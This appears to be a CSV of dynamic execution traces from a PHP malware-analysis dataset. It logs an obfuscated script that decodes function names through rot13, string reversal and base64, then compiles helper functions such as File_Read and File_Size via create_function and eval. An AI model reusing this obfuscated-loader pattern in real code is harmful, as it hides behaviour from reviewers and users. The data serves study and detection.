uuid,file_md5,index,source,target,argc,argv,return,dynamic
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,602,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,603,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,604,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,605,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,606,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,607,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,608,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,609,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""9OvPA0UVtNPVtNPVtbDQ7VPIGOvVhxvZfVTMx8FM6y2pxtPMhI3olOvolIUqyWUVtNPVtNPVtNPVtNvPANlrtNPVtNPVtNvPAH2pfIJPWbDQ9OPVtNPVtNPVX0jBvDSVv4""]]}","{""value"": ""MaIhL3Eco24tEzyfMI9GnKcyXPEmnKcyXD0XrlNAPvNtVPNtVPNtWTgvVQ0tZGNlAQftVPNtVPNtQDbtVPNtVPNtVPEgLvN9VQRjZwDtXvNxn2V7VPNAPvNtVPNtVPNtWT""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,610,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9GnKcyXPEmnKcyXD0XrlNAPvNtVPNtVPNtWTgvVQ0tZGNlAQftVPNtVPNtQDbtVPNtVPNtVPEgLvN9VQRjZwDtXvNxn2V7VPNAPvNtVPNtVPNtWT""]]}","{""value"": ""ZnVuY3Rpb24gRmlsZV9TaXplKCRzaXplKQ0KeyANCiAgICAgICAgJGtiID0gMTAyNDsgICAgICAgDQogICAgICAgICRtYiA9IDEwMjQgKiAka2I7ICANCiAgICAgICAgJG""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,611,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9TaXplKCRzaXplKQ0KeyANCiAgICAgICAgJGtiID0gMTAyNDsgICAgICAgDQogICAgICAgICRtYiA9IDEwMjQgKiAka2I7ICANCiAgICAgICAgJG""]]}","{""value"": ""function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = ""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,612,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = ""]]}","{""value"": ""\\x00lambda_24""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,613,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = 1024 * $gb;\r\n\t\t$db = 1024 * $tb;\r\n        if($size < $kb)\r\n        {\r\n            return $size.\"" B\"";\r\n        }\r\n        else if($size < $mb)\r\n        { \r\n            return round($size/$kb,2).\"" K\"";\r\n        }\r\n        else if($size < $gb)\r\n        { \r\n            return round($size/$mb,2).\"" M\"";\r\n        }\r\n        else if($size < $tb)\r\n        { \r\n            return round($size/$gb,2).\"" G\"";\r\n        }\r\n        else if($size < $db)\r\n        { \r\n            return round($size/$tb,2).\"" T\"";\r\n        }\r\n\t\telse\r\n        { \r\n            return round($size/$db,2).\"" ST\"";\r\n        }\r\n }}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,614,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,615,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0jByE2owITocMTWt4zp1EKMlytPAfGXykTMhSTnxtFMm9TowMTDWbDQ7xFXy1JLhITocMTWbHzrcAKMfyzMNkFMfEzouuTWbDJLyWaMNOFCtHTMiAJMfyzMxxtPAf""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,616,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,617,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,618,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,619,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,620,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,621,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,622,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,623,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,624,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,625,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,626,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0jByE2owITocMTWt4zp1EKMlytPAfGXykTMhSTnxtFMm9TowMTDWbDQ7xFXy1JLhITocMTWbHzrcAKMfyzMNkFMfEzouuTWbDJLyWaMNOFCtHTMiAJMfyzMxxtPAf""]]}","{""value"": ""MaIhL3Eco24tEzyfMI9FMJSxXPEznJkyozSgMFxAPafAPtxxnTShMTkyVQ0tDTMipTIhXPEznJkyozSgMFjvpzVvXGfAPtxxMzyfMJAiMTHtCFONMaWyLJDbWTuuozEfMF""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,627,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9FMJSxXPEznJkyozSgMFxAPafAPtxxnTShMTkyVQ0tDTMipTIhXPEznJkyozSgMFjvpzVvXGfAPtxxMzyfMJAiMTHtCFONMaWyLJDbWTuuozEfMF""]]}","{""value"": ""ZnVuY3Rpb24gRmlsZV9SZWFkKCRmaWxlbmFtZSkNCnsNCgkkaGFuZGxlID0gQGZvcGVuKCRmaWxlbmFtZSwicmIiKTsNCgkkZmlsZWNvZGUgPSBAZnJlYWQoJGhhbmRsZS""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,628,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9SZWFkKCRmaWxlbmFtZSkNCnsNCgkkaGFuZGxlID0gQGZvcGVuKCRmaWxlbmFtZSwicmIiKTsNCgkkZmlsZWNvZGUgPSBAZnJlYWQoJGhhbmRsZS""]]}","{""value"": ""function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,629,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose""]]}","{""value"": ""\\x00lambda_25""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,630,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose($handle);\r\n\treturn $filecode;\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,631,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,632,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""9cDQtNFstNPVtbDQtNlBuEKLxEPVhWKq0IzptNPVtbDQtNFstNPVtNPVtNvPANPV9OPVtNPVtNPVtNPVtbDQtNlBcDJMx92LhITWtjPq1OUq19TWtjFL0STMxtlMhyTMiA""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,633,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,634,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,635,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,636,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,637,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,638,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,639,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,640,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,641,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,642,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,643,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""9cDQtNFstNPVtbDQtNlBuEKLxEPVhWKq0IzptNPVtbDQtNFstNPVtNPVtNvPANPV9OPVtNPVtNPVtNPVtbDQtNlBcDJMx92LhITWtjPq1OUq19TWtjFL0STMxtlMhyTMiA""]]}","{""value"": ""MaIhL3Eco24tLKWlLKysnJAioaLbWTEuqTRfVPNxo3I0pUI0VQ0tW3I0Mv04WlxtrlNtQDbtVPNtWTIhL29xMI9upaVtCFOupaWurFtaIIETYGtaYPqOH0AWFFpfW0qPFl""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,644,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tLKWlLKysnJAioaLbWTEuqTRfVPNxo3I0pUI0VQ0tW3I0Mv04WlxtrlNtQDbtVPNtWTIhL29xMI9upaVtCFOupaWurFtaIIETYGtaYPqOH0AWFFpfW0qPFl""]]}","{""value"": ""ZnVuY3Rpb24gYXJyYXlfaWNvbnYoJGRhdGEsICAkb3V0cHV0ID0gJ3V0Zi04JykgeyAgDQogICAgJGVuY29kZV9hcnIgPSBhcnJheSgnVVRGLTgnLCdBU0NJSScsJ0dCSy""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,645,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gYXJyYXlfaWNvbnYoJGRhdGEsICAkb3V0cHV0ID0gJ3V0Zi04JykgeyAgDQogICAgJGVuY29kZV9hcnIgPSBhcnJheSgnVVRGLTgnLCdBU0NJSScsJ0dCSy""]]}","{""value"": ""function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-wi""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,646,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-wi""]]}","{""value"": ""\\x00lambda_26""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,647,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-win','sjis-win','EUC-JP');  \r\n    $encoded = mb_detect_encoding($data, $encode_arr);  \r\n  \r\n    if (!is_array($data)) {  \r\n        return mb_convert_encoding($data, $output, $encoded);  \r\n    }  \r\n    else {  \r\n        foreach ($data as $key=>$val) {  \r\n            $key = array_iconv($key, $output);  \r\n            if(is_array($val)) {  \r\n                $data[$key] = array_iconv($val, $output);  \r\n            } else {  \r\n            $data[$key] = mb_convert_encoding($data, $output, $encoded);  \r\n            }  \r\n        }  \r\n    return $data;  \r\n    }  \r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,648,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,649,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""9cDQ7xvoykTWfpvYh4lWfRTquETWbH2LukTpyW3KlE3pvI3pt4zp1EKMlytPAfGL0STMxNvolIUqyWUVc4JMfEPV8NFXuEKLxEPXhITolE3pbLJnWbDQ7cDQc4JMfEPYuE""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,650,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,651,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,652,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,653,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,654,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,655,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,656,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,657,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,658,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,659,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,660,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""9cDQ7xvoykTWfpvYh4lWfRTquETWbH2LukTpyW3KlE3pvI3pt4zp1EKMlytPAfGL0STMxNvolIUqyWUVc4JMfEPV8NFXuEKLxEPXhITolE3pbLJnWbDQ7cDQc4JMfEPYuE""]]}","{""value"": ""MaIhL3Eco24tGKympJksGTIhXPExLKEuYPEfMJ4cQDc7QDbWnJLbp3EloTIhXPExLKEuXFN8VPEfMJ4cVUWyqUIlovNxMTS0LGfAPtylMKE1pz4tp3Ivp3ElK3WypTkuL2""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,661,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tGKympJksGTIhXPExLKEuYPEfMJ4cQDc7QDbWnJLbp3EloTIhXPExLKEuXFN8VPEfMJ4cVUWyqUIlovNxMTS0LGfAPtylMKE1pz4tp3Ivp3ElK3WypTkuL2""]]}","{""value"": ""ZnVuY3Rpb24gTXlzcWxfTGVuKCRkYXRhLCRsZW4pDQp7DQoJaWYoc3RybGVuKCRkYXRhKSA8ICRsZW4pIHJldHVybiAkZGF0YTsNCglyZXR1cm4gc3Vic3RyX3JlcGxhY2""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,662,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gTXlzcWxfTGVuKCRkYXRhLCRsZW4pDQp7DQoJaWYoc3RybGVuKCRkYXRhKSA8ICRsZW4pIHJldHVybiAkZGF0YTsNCglyZXR1cm4gc3Vic3RyX3JlcGxhY2""]]}","{""value"": ""function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,663,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}""]]}","{""value"": ""\\x00lambda_27""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,664,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,665,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,666,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0jB5I2nxNvolIUqyWKPX0jBcHTox5JLbEPXyA3ofAzMNytPA0KPX0jByAUouMTV6NFM1WUqt8QVcDUryEUWfHTox5JLbEPXyEKnlqaMNOFCtxKMeEFPWbDQ7xvA2L""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,667,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,668,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,669,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,670,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,671,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,672,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,673,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,674,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,675,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,676,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,677,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0jB5I2nxNvolIUqyWKPX0jBcHTox5JLbEPXyA3ofAzMNytPA0KPX0jByAUouMTV6NFM1WUqt8QVcDUryEUWfHTox5JLbEPXyEKnlqaMNOFCtxKMeEFPWbDQ7xvA2L""]]}","{""value"": ""MaIhL3Eco24tMT9sq3WcqTHbWTMcoTHfWUDfWUEyrUDcQDc7QDbWWTgyrFN9VUElqJH7QDbWWTuuozEfMFN9VROzo3OyovtxMzyfMFjxqPx7QDbWnJLbVHOzq3WcqTHbWT""}",[0]
